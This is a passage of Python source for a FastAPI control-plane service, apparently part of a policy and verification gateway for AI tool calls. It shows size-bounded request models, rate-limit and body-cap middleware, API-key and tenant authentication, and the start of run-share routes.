"""FastAPI app — cloud control plane (hardened per P3 security review).

Endpoints:
  GET  /healthz                        — public
  GET  /pubkey                         — public; returns {kid, pubkey_pem}
  POST /citation_verify                — requires `X-Api-Key`
  POST /hitl/{id}/approve|reject       — requires `X-Hitl-Api-Key` (or 503 fail-closed)
  GET  /hitl                           — requires `X-Hitl-Api-Key`
  GET  /ledger                         — requires `X-Api-Key`, paginated, body redacted by default

Invariants enforced here:
  - issued tokens always have `exp` (≤ TOKEN_TTL_SECONDS) and a `kid` (key id)
  - tokens never include private material
  - HITL decisions are one-shot (pending → approved|rejected)
  - ledger is append-only at the API surface (no DELETE/UPDATE routes)
  - chain head is serialized via an asyncio.Lock (H1 fix — defend race on `prev`)
  - protected token fields cannot be clobbered by HITL `extra` (L2 fix)
"""
from __future__ import annotations
import asyncio
import hashlib
import os
import re
import time
from pathlib import Path
from typing import Callable, Literal

from fastapi import Body, Depends, FastAPI, Header, HTTPException, Query, Request
from fastapi import Path as FPath
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field, field_validator
from starlette.middleware.base import BaseHTTPMiddleware

from ..evidence import sign_token
from ..policy import (
    AnyPolicy, ContextInjectionPolicy, EvidencePolicy, InputRewritePolicy,
    McpGatingPolicy, PermissionPolicy, PolicyOverride,
    RunCommandPolicy, SubagentPolicy, apply_rewriter,
    compile_to_managed_settings, matcher_covers,
)
from ..verifier import (Citation, EntailmentClassifier, score_review_citations,
                        verify_document)
from ..verifier.protocol import VerifierRegistry
from ..verifier.sources import DictResolver
from .custom_verifier_store import (
    CustomVerifierConflict, CustomVerifierError, CustomVerifierStore,
    build_from_dict as build_custom_verifier_from_dict,
    serialize as serialize_custom_verifier,
)
from .policy_store import PolicyStore, _evidence_req_to_dict
from .pack_store import (
    PackStore, UserPackRow, slugify_name, validate_user_slug,
)
from .script_store import (
    MAX_SCRIPT_BYTES, ScriptStore, ScriptStoreConflict, ScriptStoreError,
    ScriptStoreInUseError, serialize as serialize_script_entry,
)
from .db import (
    EndpointHeartbeatRepo, HitlRepo, LedgerRepo, SharedRunRepo,
    init_schema, is_stale, make_engine,
)
from .keys import KeyStore
from .presets_catalog import vendor_catalog


TOKEN_TTL_SECONDS = 600   # short, refreshable. License expiry = fail-closed.
MAX_REQUEST_BYTES = 256 * 1024
MAX_CITATIONS_PER_REQUEST = 50
MAX_QUOTE_LEN = 8_000
MAX_REF_LEN = 1_000
MAX_DOCUMENT_LEN = 200_000
MAX_CORPUS_OVERRIDE_BYTES = 200_000

PROTECTED_TOKEN_FIELDS = {
    "step",
    # PR4: canonical keying ONLY. Subject = generic subject identifier
    # (e.g. "session_abc", "req_xyz", or for legal verticals: matter id).
    # payload_hash = sha256 of canonical tool payload (or for legal:
    # doc_id). PR2 had a transition window with legacy `matter`/`doc_hash`
    # mirrored alongside; PR4 drops both legacy names from the protected
    # set and from token bodies entirely. Any deployed gate older than
    # PR2 will no longer find a verifying token — operators upgrading
    # past PR4 must roll forward gate binaries first.
    "subject", "payload_hash",
    "verdict", "iat", "exp", "issuer", "kid",
}


# ── PR2 synthesis helpers ─────────────────────────────────────────────
def _canonical_json_bytes(payload: dict) -> bytes:
    """Compact canonical JSON used ONLY for `_synth_subject_and_hash`.

    NOTE: This uses `separators=(",", ":")` (compact); the ledger's
    `_canonical` in `cloud/db.py` and the token signer's `_canonical` in
    `evidence/tokens.py` both use Python's DEFAULT separators (with
    whitespace). The byte sequences therefore differ — this hash is an
    opaque request-time tag, NOT a value you can cross-check against a
    ledger-chain hash or a token body. PR3/PR4 work that wants to verify a
    request-time payload_hash against a ledger entry must canonicalise via
    the matching helper, not this one.
    """
    import json as _json
    return _json.dumps(payload, sort_keys=True, ensure_ascii=False,
                        separators=(",", ":")).encode("utf-8")


def _synth_subject_and_hash(payload: dict | None,
                             session_id: str | None = None) -> tuple[str, str]:
    """Derive (subject, payload_hash) when neither was supplied.

    subject defaults to:
      - `session_<session_id>` when a session id is known
      - `req_<random hex>`     otherwise (one-shot opaque tag)

    Per PR2 review (issue #1 follow-up), synth output is constrained to the
    legacy `_KEY_PATTERN` charset (`[A-Za-z0-9_\\-]`). Earlier drafts used a
    colon separator (`session:<id>`), but mixing colon-bearing and legacy
    alphanumeric-only matter shapes in the ledger / HITL index produces
    silent data drift (two cohorts of identifiers with no documented
    schema). Underscore separator keeps the column shape uniform during the
    PR2→PR3 widening window AND makes the subject reachable from the
    sentinel charset `[A-Za-z0-9_\\-]+` should anyone wire it into a future
    sentinel template.

    session_id is also sanitised here: any characters outside `_KEY_PATTERN`
    are stripped. This closes the equivalent injection path that
    VerifyDispatchReq.subject explicitly rejects via regex constraint —
    without this, a hand-crafted `payload={"session_id": "...\\n..."}` would
    smuggle bad bytes into the ledger key.

    payload_hash is sha256 of the canonical_json(payload) — empty payload
    becomes sha256("{}"), which is still a stable address (a verifier
    looking at "no payload" deterministically reproduces it).
    """
    import secrets
    if session_id:
        # Strip anything outside the legacy key charset; bound the length so
        # the synthesised subject stays well under the 64-char DB column.
        safe = re.sub(r"[^A-Za-z0-9_\-]", "", session_id)[:48]
        if safe:
            subject = f"session_{safe}"
        else:
            # session_id contained nothing usable — fall back to nonce.
            subject = f"req_{secrets.token_hex(8)}"
    else:
        subject = f"req_{secrets.token_hex(8)}"
    body = payload if isinstance(payload, dict) else {}
    payload_hash = hashlib.sha256(_canonical_json_bytes(body)).hexdigest()[:32]
    return subject, payload_hash


# ── request/response shapes (size-bounded per P3 #C2) ────────────────
class CitationIn(BaseModel):
    quote: str = Field(..., min_length=1, max_length=MAX_QUOTE_LEN)
    ref: str = Field(..., min_length=1, max_length=MAX_REF_LEN)


# Shared regex for both old and new key fields — kept identical so the
# alias path doesn't smuggle in shapes the legacy path would reject.
_KEY_PATTERN = r"^[A-Za-z0-9_\-]+$"


class VerifyReq(BaseModel):
    """v1 citation_verify request shape.

    PR4: legacy `matter`/`doc_id` aliases removed. Only `subject` and
    `payload_hash` are accepted. A request that still carries the legacy
    fields is a clean 422 (pydantic's `extra="forbid"` rejects unknown
    keys) so a caller stuck on the old vocabulary surfaces immediately
    rather than silently winning under a mirror.
    """
    model_config = {"extra": "forbid"}

    subject: str = Field(..., min_length=1, max_length=64,
                          pattern=_KEY_PATTERN)
    payload_hash: str = Field(..., min_length=1, max_length=64,
                               pattern=_KEY_PATTERN)
    document: str = Field(default="", max_length=MAX_DOCUMENT_LEN)
    citations: list[CitationIn] = Field(default_factory=list,
                                         max_length=MAX_CITATIONS_PER_REQUEST)
    corpus_override: dict[str, str] | None = None


class DecideReq(BaseModel):
    approver: str = Field(..., min_length=1, max_length=256)
    note: str | None = Field(default=None, max_length=2_000)


# v1.1-PD: NL→IR compile + review.
class PriorTurnIn(BaseModel):
    role: str = Field(..., pattern=r"^(user|assistant)$")
    content: str = Field(..., min_length=1, max_length=10_000)


class CompileReq(BaseModel):
    # Bounded so a runaway NL can't pin LLM tokens or push past the body cap.
    nl: str = Field(..., min_length=1, max_length=20_000)
    prior_turns: list[PriorTurnIn] | None = Field(default=None, max_length=20)


# D55a: conversational compile (turn-by-turn variant of /policies/compile).
# Shares its caps with the library module so the boundary is single-
# source-of-truth.
from ..policy.nl_compiler_interactive import (
    MAX_ANSWER_KEY_CHARS as _D55A_MAX_ANSWER_KEY_CHARS,
    MAX_ANSWER_VALUE_CHARS as _D55A_MAX_ANSWER_VALUE_CHARS,
    MAX_ANSWERS as _D55A_MAX_ANSWERS,
    MAX_ASSISTANT_MESSAGE_CHARS as _D55A_MAX_ASSISTANT_MESSAGE_CHARS,
    MAX_HISTORY_TURNS as _D55A_MAX_HISTORY_TURNS,
    MAX_USER_MESSAGE_CHARS as _D55A_MAX_USER_MESSAGE_CHARS,
)


class InteractiveTurnIn(BaseModel):
    """One {role, content} pair in the conversational compile history.

    Per-turn caps are SYMMETRIC: both user and assistant turns share
    the user-message cap. Earlier versions used `max(user_cap, 10_000)`
    on assistant turns on the theory that they're echoes of server
    output. That is not a guarantee at the library boundary, since a
    direct caller (not via FastAPI) can ship a 50K-char assistant turn
    and use it as a prompt-injection surface (the LLM is steered by
    fenced assistant content). The library's `_validate_history` also
    enforces symmetric caps; both boundaries agree.
    """
    model_config = {"extra": "forbid"}

    role: str = Field(..., pattern=r"^(user|assistant)$")
    content: str = Field(
        ..., min_length=1,
        max_length=max(_D55A_MAX_USER_MESSAGE_CHARS,
                        _D55A_MAX_ASSISTANT_MESSAGE_CHARS),
    )


class InteractiveCompileReq(BaseModel):
    """Body for POST /policies/compile-interactive.

    `draft_so_far` is a loose dict at this boundary; the library
    module's `_sanitize_draft_so_far` drops unknown top-level keys and
    coerces subtrees to safe shapes (so a client cannot pre-seed
    `gate_binary`, `pattern`, or other archetype-specific fields by
    stuffing them into the draft).

    `answers` is constrained at the pydantic boundary AND in the
    library so a runaway request 422s before the library's aggregate
    cap deep-copies a multi-MB payload. The library's
    `_validate_answers_shape` enforces the same bounds for direct
    callers.
    """
    model_config = {"extra": "forbid"}

    history: list[InteractiveTurnIn] | None = Field(
        default=None, max_length=_D55A_MAX_HISTORY_TURNS,
    )
    draft_so_far: dict | None = None
    answers: dict[str, str] | None = Field(
        default=None, max_length=_D55A_MAX_ANSWERS,
    )

    @field_validator("answers")
    @classmethod
    def _bound_answer_keys_and_values(
        cls, v: dict[str, str] | None,
    ) -> dict[str, str] | None:
        """Per-key / per-value length cap for `answers`.

        Pydantic v2 cannot enforce a per-key or per-value length cap
        on a `dict[str, str]` via `Field(max_length=...)` alone (that
        only bounds the number of keys). A field_validator gives us a
        clean 422 on the same boundary as the rest of the request.
        """
        if v is None:
            return v
        for k, val in v.items():
            if len(k) > _D55A_MAX_ANSWER_KEY_CHARS:
                raise ValueError(
                    f"answer key too long ({len(k)} > "
                    f"{_D55A_MAX_ANSWER_KEY_CHARS} chars)"
                )
            if len(val) > _D55A_MAX_ANSWER_VALUE_CHARS:
                raise ValueError(
                    f"answer {k!r} too long ({len(val)} > "
                    f"{_D55A_MAX_ANSWER_VALUE_CHARS} chars)"
                )
        return v


# D57g: handoff from wizard / raw editor → conversational. The body
# is a snapshot of in-progress authoring state; the response is the
# same wire shape `step_compile` emits so the conversational client
# mounts it as a first assistant turn.
class HandoffContextReq(BaseModel):
    """Body for POST /policies/handoff-context.

    Both fields are loose dicts at this pydantic boundary; the library
    module's `build_handoff_turn` reuses the same sanitisers /
    per-field allowlists `step_compile` does so a malicious client
    cannot smuggle `gate_binary` or other archetype-specific fields
    past the merge by stuffing them into the draft.

    `origin` is the authoring surface the user just left
    ("guided" / "advanced" / "review"). Used by the cloud serialiser
    to vary the summary headline. Optional.

    `locale` is an explicit "ko" / "en" override forwarded from the
    dashboard so a Korean-locale operator authoring an English-only
    policy still receives a Korean seed (the draft-content heuristic
    is too weak to detect that case on its own). Optional.
    """
    model_config = {"extra": "forbid"}

    wizard_state: dict | None = None
    draft_ir: dict | None = None
    origin: Literal["guided", "advanced", "review"] | None = None
    locale: Literal["ko", "en"] | None = None


# D53b: replay-against-last-24h dry-run authoring affordance.
class DryRunReq(BaseModel):
    """POST /policies/dry-run body. Replays a draft IR over recent
    ledger rows to estimate "if this policy were enabled, how many of
    the last 24h's tool calls would it have action'd?"

    `ir` is intentionally a loose dict at the pydantic boundary - the
    archetype-specific shape check happens via
    `_deserialize_policy_from_api` (which routes through
    `policy_from_dict` + Policy.__post_init__) inside the route. That
    keeps the validation surface identical to `/policies` PUT so an
    operator who can save the policy can also dry-run it.

    `since`: human-readable window selector. Closed enum (24h / 7d)
    so a typo cannot quietly widen the replay scope. Default 24h.

    `limit`: cap on rows replayed inside the window. The replay is
    Python-side per row so a 7d window with thousands of rows would
    pin a worker - the cap (max 10_000) is the safety net.

    `tenant_id`: which tenant's ledger to replay against. The route
    is admin-key gated (no per-request tenant resolution from the
    api key), so without this field the replay used to silently
    target the synthetic `default` tenant - producing a wrong-tenant
    count on every multi-tenant deployment. The route validates the
    value against the tenants table and 422s on an unknown id.
    Defaults to None; the route accepts None on single-tenant
    deployments (empty tenants table) for back-compat with the
    `default`-tenant single-tenant flow.
    """
    model_config = {"extra": "forbid"}

    ir: dict
    since: Literal["24h", "7d"] = "24h"
    limit: int = Field(default=1000, ge=1, le=10_000)
    tenant_id: str | None = Field(default=None, min_length=1, max_length=64,
                                   pattern=r"^[A-Za-z0-9_\-\.]+$")


# v2.0-W7: verifier payload cap (regex DoS defense). 20K is plenty for any
# realistic filing-time payload and tight enough that pathological regex
# inputs can't push past the deterministic-time budget.
MAX_VERIFIER_PAYLOAD_BYTES = 20_000


# v1.2-W3: generic verifier dispatch.
class VerifyDispatchReq(BaseModel):
    """PR4: legacy `matter`/`doc_id` aliases removed. Only `subject` and
    `payload_hash` are accepted (still optional — when omitted the route
    synthesises a (subject, payload_hash) from the payload + session id
    so the ledger entry is bound to the actual call rather than a
    literal "generic" string). `extra="forbid"` makes a request that
    still carries the legacy field names a clean 422 instead of a
    silent accept.

    Storage alignment: `max_length=64` matches `LedgerEntry.matter` /
    `HitlItem.subject` String(64) columns. `pattern=_KEY_PATTERN`
    rejects characters that would smuggle bytes into the cloud-signed
    token body or ledger column.
    """
    model_config = {"extra": "forbid"}

    # The verifier's input_schema is verifier-specific — we accept any dict
    # and let the verifier handle shape errors with a deny verdict.
    payload: dict = Field(..., description="opaque payload passed to verifier.run()")
    subject: str | None = Field(default=None, min_length=1, max_length=64,
                                pattern=_KEY_PATTERN)
    payload_hash: str | None = Field(default=None, min_length=1, max_length=64,
                                      pattern=_KEY_PATTERN)
    # D53b follow-up: frame metadata. The gate writes the hook event +
    # matcher pattern it fired on so the offline dry-run replay can
    # scope ledger rows to a specific (event, matcher) frame instead
    # of admitting every tenant row. Both are bounded short strings
    # because the cloud projects them onto the ledger body verbatim.
    hook_event: str | None = Field(default=None, min_length=1, max_length=64,
                                    pattern=r"^[A-Za-z][A-Za-z0-9_]*$")
    matcher: str | None = Field(default=None, min_length=1, max_length=256)

    def model_post_init(self, _ctx) -> None:
        # Pydantic v2: enforce payload's serialized size after construction.
        # JSON encoding is cheap relative to the regex pass that would follow.
        import json as _json
        encoded = _json.dumps(self.payload, ensure_ascii=False).encode("utf-8")
        if len(encoded) > MAX_VERIFIER_PAYLOAD_BYTES:
            raise ValueError(
                f"verifier payload too large: {len(encoded)} > "
                f"{MAX_VERIFIER_PAYLOAD_BYTES} bytes"
            )
        # If neither key was supplied, synthesise from the payload so the
        # ledger entry is bound to the actual call rather than a literal
        # "generic" string. When a session_id is in the payload we use it.
        if self.subject is None and self.payload_hash is None:
            sid = self.payload.get("session_id") if isinstance(self.payload, dict) else None
            subj, phash = _synth_subject_and_hash(self.payload, session_id=sid)
            object.__setattr__(self, "subject", subj)
            object.__setattr__(self, "payload_hash", phash)
            return
        # Partial supply: synth the missing side so downstream code can
        # rely on both being present (matches pre-PR4 "generic" default
        # behaviour minus the literal "generic" string).
        if self.subject is None:
            sid = self.payload.get("session_id") if isinstance(self.payload, dict) else None
            subj, _ = _synth_subject_and_hash(self.payload, session_id=sid)
            object.__setattr__(self, "subject", subj)
        if self.payload_hash is None:
            _, phash = _synth_subject_and_hash(self.payload)
            object.__setattr__(self, "payload_hash", phash)


class VerifyInlineReq(BaseModel):
    """D35: dispatch an inline EvidenceReq (regex / llm_critic / shacl).

    The gate sends this for any non-`step` requires entry on a policy.
    Step-kind entries continue to use the existing /verify/{step}
    endpoint so the registered verifier instance handles them with
    no closure into the cloud layer.

    PR4: legacy `matter`/`doc_id` aliases removed (extra="forbid"). Only
    `subject`/`payload_hash` are accepted; both optional with payload
    synth filling the gap, same shape as VerifyDispatchReq."""
    model_config = {"extra": "forbid"}

    kind: str = Field(..., pattern="^(regex|llm_critic|shacl)$")
    payload: dict
    subject: str | None = Field(default=None, min_length=1, max_length=64,
                                pattern=_KEY_PATTERN)
    payload_hash: str | None = Field(default=None, min_length=1, max_length=64,
                                      pattern=_KEY_PATTERN)
    # D53b follow-up: frame metadata. Same shape + semantics as the
    # one on VerifyDispatchReq above. Gates that haven't rolled forward
    # past the runtime-write contract simply omit these fields; the
    # ledger row will be excluded from offline regex/llm_critic/shacl
    # dry-run replays (the replay refuses to admit rows whose frame
    # cannot be reconstructed).
    hook_event: str | None = Field(default=None, min_length=1, max_length=64,
                                    pattern=r"^[A-Za-z][A-Za-z0-9_]*$")
    matcher: str | None = Field(default=None, min_length=1, max_length=256)
    # kind-specific
    pattern: str | None = Field(default=None, max_length=2000)
    # D82c fix: optional dotted-identifier scoping for kind=regex. Empty
    # / unset → match whole-payload projection (legacy). Non-empty →
    # scope `re.search` to the resolved field only, so an operator who
    # picks `tool_response.output` does NOT also match SSN strings in
    # `tool_input.command` / `tool_input.description` / etc.
    field_path: str | None = Field(
        default=None,
        max_length=256,
        pattern=r"^[A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z_][A-Za-z0-9_]*)*$",
    )
    criterion: str | None = Field(default=None, max_length=4000)
    shape_ttl: str | None = Field(default=None, max_length=16000)

    def model_post_init(self, _ctx) -> None:
        import json as _json
        encoded = _json.dumps(self.payload, ensure_ascii=False).encode("utf-8")
        if len(encoded) > MAX_VERIFIER_PAYLOAD_BYTES:
            raise ValueError(
                f"verifier payload too large: {len(encoded)} > "
                f"{MAX_VERIFIER_PAYLOAD_BYTES} bytes"
            )
        # Same synth contract as VerifyDispatchReq above.
        if self.subject is None and self.payload_hash is None:
            sid = self.payload.get("session_id") if isinstance(self.payload, dict) else None
            subj, phash = _synth_subject_and_hash(self.payload, session_id=sid)
            object.__setattr__(self, "subject", subj)
            object.__setattr__(self, "payload_hash", phash)
            return
        if self.subject is None:
            sid = self.payload.get("session_id") if isinstance(self.payload, dict) else None
            subj, _ = _synth_subject_and_hash(self.payload, session_id=sid)
            object.__setattr__(self, "subject", subj)
        if self.payload_hash is None:
            _, phash = _synth_subject_and_hash(self.payload)
            object.__setattr__(self, "payload_hash", phash)


# ── Q97a: /admin/llm-keys body shapes (module-scope so FastAPI's
# get_type_hints can resolve them on Python 3.14) ────────────────────
class LlmKeysPutReq(BaseModel):
    """PUT body for /admin/llm-keys.

    Both fields optional. A missing field LEAVES the prior value
    unchanged (NOT cleared). An empty string CLEARS that key. A
    non-empty string overwrites. The store performs no validation
    beyond a length cap; the LLM provider will raise on first call if
    the value is malformed.
    """
    model_config = {"extra": "forbid"}
    anthropic_api_key: str | None = Field(default=None, max_length=4096)
    openai_api_key: str | None = Field(default=None, max_length=4096)


class LlmKeysTestReq(BaseModel):
    """POST body for /admin/llm-keys/test. Optional `provider` field
    narrows the probe to anthropic or openai; absent / null runs both."""
    model_config = {"extra": "forbid"}
    provider: Literal["anthropic", "openai"] | None = None


# ── middlewares ──────────────────────────────────────────────────────
class MaxBodyMiddleware(BaseHTTPMiddleware):
    """413 on Content-Length OR by accumulating a streamed/chunked body."""

    def __init__(self, app, limit: int):
        super().__init__(app)
        self.limit = limit

    async def dispatch(self, request: Request, call_next):
        cl = request.headers.get("content-length")
        if cl and cl.isdigit() and int(cl) > self.limit:
            return _json_response(413, {"detail": "request body too large"})
        # Wrap ASGI receive to count bytes for chunked / unknown-CL bodies
        recv = request._receive
        consumed = 0
        limit = self.limit

        async def capped_receive():
            nonlocal consumed
            msg = await recv()
            if msg["type"] == "http.request":
                body = msg.get("body") or b""
                consumed += len(body)
                if consumed > limit:
                    raise _BodyTooLarge()
            return msg

        request._receive = capped_receive
        try:
            return await call_next(request)
        except _BodyTooLarge:
            return _json_response(413, {"detail": "request body too large"})


class _BodyTooLarge(Exception):
    pass


class TokenBucketLimiter(BaseHTTPMiddleware):
    """Per-key (or per-IP fallback) token bucket. Tiny, in-process — adequate
    for v0 single-pod. Swap for slowapi/Redis in P5.
    """
    def __init__(self, app, *, capacity: int = 60, refill_per_sec: float = 10.0):
        super().__init__(app)
        self.cap = capacity
        self.refill = refill_per_sec
        self._buckets: dict[str, tuple[float, float]] = {}   # key → (tokens, last_ts)

    async def dispatch(self, request: Request, call_next):
        # No throttling on health/pubkey (cheap, public)
        if request.url.path in ("/healthz", "/pubkey"):
            return await call_next(request)
        key = (request.headers.get("x-api-key")
               or request.headers.get("x-hitl-api-key")
               or request.client.host if request.client else "anon")
        now = time.time()
        tokens, last = self._buckets.get(key, (self.cap, now))
        tokens = min(self.cap, tokens + (now - last) * self.refill)
        if tokens < 1:
            self._buckets[key] = (tokens, now)
            return _json_response(429, {"detail": "rate limit exceeded"})
        self._buckets[key] = (tokens - 1, now)
        return await call_next(request)


def _json_response(status: int, payload: dict):
    from fastapi.responses import JSONResponse
    return JSONResponse(payload, status_code=status)


# ── auth deps (constant-time compare; fail-closed if env unset) ──────
def _check_key(env_var: str, header_value: str | None) -> None:
    import hmac
    expected = os.environ.get(env_var)
    if not expected:
        # Don't echo env var name back to anonymous callers (enumeration)
        raise HTTPException(503, "service unavailable: auth not configured")
    if not header_value or not hmac.compare_digest(header_value, expected):
        raise HTTPException(401, "invalid or missing api key")


def require_api_key(x_api_key: str | None = Header(default=None)) -> None:
    _check_key("MAGI_CP_API_KEY", x_api_key)


def require_hitl_key(x_hitl_api_key: str | None = Header(default=None)) -> None:
    _check_key("MAGI_CP_HITL_API_KEY", x_hitl_api_key)


def require_admin_key(x_admin_api_key: str | None = Header(default=None)) -> None:
    _check_key("MAGI_CP_ADMIN_API_KEY", x_admin_api_key)


def require_tenant_auth(
    request: Request, x_api_key: str | None = Header(default=None),
) -> None:
    """Multi-tenant aware data-plane auth.

    Recognises:
      - Legacy `MAGI_CP_API_KEY` env value → synthetic `default` tenant.
      - DB-issued `mcp_…` keys hashed in `api_keys` table → joined tenant.

    Sets `request.state.tenant_id` for downstream endpoints to scope queries.
    """
    from .tenants import authenticate_request
    engine = request.app.state.engine
    auth = authenticate_request(engine, x_api_key)
    if auth is None:
        raise HTTPException(401, "invalid or missing api key")
    request.state.tenant_id = auth.tenant_id
    request.state.api_key_id = auth.api_key_id


def _resolve_tenant_id_from_request(request: Request) -> str | None:
    """Best-effort tenant resolution for routes where auth is OPTIONAL.

    Used by /verifiers + /catalog/evidence-types so that an unauthenticated
    caller gets the global view (legacy behaviour) while an authenticated
    caller transparently sees their tenant's custom verifiers merged in.
    Mirrors the shape of require_tenant_auth but returns None instead of
    raising on missing / invalid auth.
    """
    from .tenants import authenticate_request
    # If require_tenant_auth has already run on this request, reuse its
    # decision. Saves a DB round-trip on the common authed case.
    cached = getattr(request.state, "tenant_id", None)
    if cached is not None:
        return cached
    api_key = request.headers.get("x-api-key")
    if not api_key:
        return None
    engine = getattr(request.app.state, "engine", None)
    if engine is None:
        return None
    try:
        auth = authenticate_request(engine, api_key)
    except Exception:
        return None
    if auth is None:
        return None
    return auth.tenant_id


# ── factory ──────────────────────────────────────────────────────────
def create_app(
    *,
    keystore: KeyStore | None = None,
    dsn: str | None = None,
    nli_classifier: EntailmentClassifier | None = None,
    policy_store_path: str | None = None,
    pack_store_path: str | None = None,
    custom_verifier_store_path: str | None = None,
    verifier_registry: "VerifierRegistry | None" = None,
    llm_compiler: "object | None" = None,
    llm_reviewer: "object | None" = None,
) -> FastAPI:
    # P8 fix-cycle #2: in deployments where MAGI_CP_REQUIRE_REGISTRY=1
    # the factory refuses a None registry. Production sets this via the
    # Helm chart / fly.toml; test/library callers leave it unset and
    # keep the lenient "registry=None → enforcing" path for fixture
    # back-compat. The runtime invariant in _build_production_app is
    # the deploy-shape guarantee; this env hook is the override for
    # operators who construct their own factory wiring.
    if (verifier_registry is None
            and os.environ.get("MAGI_CP_REQUIRE_REGISTRY") == "1"):
        raise RuntimeError(
            "magi-cp create_app: MAGI_CP_REQUIRE_REGISTRY=1 but no "
            "verifier_registry was supplied. Wire a "
            "VerifierRegistry (register_builtins, then pass to "
            "create_app) or unset the env var for a hermetic test "
            "factory."
        )
    ks = keystore or KeyStore(dir=os.environ.get("MAGI_CP_KEY_DIR",
                                                  str(Path.home() / ".magi-cp" / "cloud")))
    ks.ensure_keypair()
    engine = make_engine(dsn or os.environ.get("MAGI_CP_DSN",
                                                "sqlite:///./magi-cp.sqlite"))
    init_schema(engine)
    ledger = LedgerRepo(engine)
    hitl = HitlRepo(engine)
    share_repo = SharedRunRepo(engine)
    policy_store = PolicyStore(path=policy_store_path or os.environ.get(
        "MAGI_CP_POLICY_STORE", str(Path.home() / ".magi-cp" / "policies.json")))
    # D75: user-pack registry. Default path lives alongside the policy
    # store; built-in packs are catalog-only (no on-disk row needed).
    pack_store = PackStore(path=pack_store_path or os.environ.get(
        "MAGI_CP_PACK_STORE",
        str(Path.home() / ".magi-cp" / "packs.json"),
    ))
    custom_verifier_store = CustomVerifierStore(
        path=custom_verifier_store_path or os.environ.get(
            "MAGI_CP_CUSTOM_VERIFIER_STORE",
            str(Path.home() / ".magi-cp" / "custom_verifiers.json"),
        ),
    )
    # D63: ScriptStore lives alongside the policy store. The directory
    # holds the bodies + an index.json — see `script_store.py` for
    # layout. Default-on rooted at ~/.magi-cp/ matches the rest of the
    # self-host install.
    script_store = ScriptStore(
        dir=os.environ.get(
            "MAGI_CP_SCRIPT_STORE_DIR",
            str(Path.home() / ".magi-cp"),
        ),
    )

    # cache pubkey + derive kid (key id)
    pubkey_pem = ks.public_pem()
    kid = hashlib.sha256(pubkey_pem.encode("utf-8")).hexdigest()[:16]

    # H1: chain-head serialization
    chain_lock = asyncio.Lock()
    # v1: policy mutation serialization — prevents lost-update race on /policies PUT|PATCH.
    policy_lock = asyncio.Lock()
    # D52b fix-cycle: same lost-update defense for /custom-verifiers POST.
    # Two concurrent POSTs on the same tenant would otherwise both read
    # the same on-disk state and the second save would overwrite the
    # first's row.
    custom_verifier_lock = asyncio.Lock()
    # D63: script-store mutation lock. Same lost-update defense
    # PolicyStore + CustomVerifierStore use for concurrent POSTs.
    script_store_lock = asyncio.Lock()
    # D75: pack-store mutation lock. Same lost-update defense for
    # POST / PUT / DELETE /policy-packs.
    pack_store_lock = asyncio.Lock()

    app = FastAPI(title="magi-control-plane cloud", version="0.0.1")
    # Order matters: outer → inner. Body cap first, then rate limit, then CORS.
    app.add_middleware(TokenBucketLimiter, capacity=120, refill_per_sec=10.0)
    app.add_middleware(MaxBodyMiddleware, limit=MAX_REQUEST_BYTES)
    # Server-to-server only; explicit deny is safer than implicit defaults.
    app.add_middleware(CORSMiddleware, allow_origins=[], allow_methods=[],
                       allow_headers=[], allow_credentials=False)
    app.state.keystore = ks
    app.state.engine = engine
    app.state.kid = kid
    app.state.verifier_registry = verifier_registry
    # D63 P1 (TOCTOU race on DELETE /scripts): expose policy_lock so
    # the script_store DELETE handler can hold BOTH policy_lock +
    # script_store_lock around the reference scan + delete sequence.
    # Pre-D63 callers (tests + legacy) read this off app.state too.
    app.state.policy_lock = policy_lock
    app.state.script_store_lock = script_store_lock
    # Q97a: LLM provider singletons exposed via app.state so the admin
    # /admin/llm-keys PUT route can rebuild them in-place after a key
    # change, and the very next /policies/compile-interactive call picks
    # up the new credentials WITHOUT a container restart. The closure
    # vars `llm_compiler` / `llm_reviewer` remain the source-of-truth at
    # construction time; routes prefer `app.state.llm_*` when populated
    # so a runtime swap takes effect.
    app.state.llm_compiler = llm_compiler
    app.state.llm_reviewer = llm_reviewer
    # Single read-modify-write lock around the LLM key store so two
    # concurrent PUTs cannot interleave reads (lost-update parity with
    # policy_lock / custom_verifier_lock).
    llm_keys_lock = asyncio.Lock()
    app.state.llm_keys_lock = llm_keys_lock

    @app.get("/healthz")
    def healthz() -> dict:
        return {"status": "ok"}

    # ── run-share links ──────────────────────────────────────────────
    # The CLI (`magi-cp share`) uploads an already-redacted openmagi.runView.v1
    # view; we RE-SCRUB on ingest (defense in depth — never trust the client to
    # have redacted) and store it under an opaque token. The public GET serves
    # it without auth (the dashboard fetches it server-side; CORS stays deny-all).
    _SHARE_BASE_URL = os.environ.get(
        "MAGI_CP_SHARE_BASE_URL", "https://cloud.openmagi.ai"
    ).rstrip("/")
    _SHARE_TTL_SECONDS = int(os.environ.get("MAGI_CP_SHARE_TTL_SECONDS", "0")) or None

    @app.post("/v1/runs/share", dependencies=[Depends(require_tenant_auth)])
    async def runs_share(request: Request) -> dict:
        from ..share.redaction import build_public_run_view

        try:
            body = await request.json()
        except Exception as exc:
            raise HTTPException(400, "body must be valid JSON") from exc
        if not isinstance(body, dict):
            raise HTTPException(400, "body must be an object")
        view = body.get("view")
        if not isinstance(view, dict):
            raise HTTPException(400, "missing 'view' object")
        if view.get("schemaVersion") != "openmagi.runView.v1":
            raise HTTPException(400, "unsupported view schemaVersion")
        # Re-scrub: the stored view is always the server's own projection.
        redacted = build_public_run_view(view)
        token = share_repo.create(
            tenant_id=request.state.tenant_id,
            view=redacted,
            ttl_seconds=_SHARE_TTL_SECONDS,
        )
        return {"token": token, "url": f"{_SHARE_BASE_URL}/r/{token}"}

    @app.get("/share/run/{token}")
    def share_run_get(token: str) -> dict:
        from ..share.edits import apply_share_edits

        row = share_repo.get_active(token)
        if row is None:
            raise HTTPException(404, "not found")
        # Apply the owner's non-destructive edits (range / hide / redact) over
        # the stored full export before serving the public page.
        view = apply_share_edits(row.view, row.edits) if row.edits else row.view
        return {"view": view, "createdAt": row.created_at}

    @app.get("/v1/runs/share/{token_hash}", dependencies=[Depends(require_tenant_auth)])
    def runs_share_get_for_edit(token_hash: str, request: Request) -> dict:
        """Owner-only: the FULL un-edited view + current edits, for the editor."""
        row = share_repo.get_by_hash(token_hash, request.state.tenant_id)
        if row is None:
            raise HTTPException(404, "not found")
        return {"view": row.view, "edits": row.edits or {}, "createdAt": row.created_at}

    @app.patch("/v1/runs/share/{token_hash}/edits", dependencies=[Depends(require_tenant_auth)])
    async def runs_share_set_edits(token_hash: str, request: Request) -> dict:
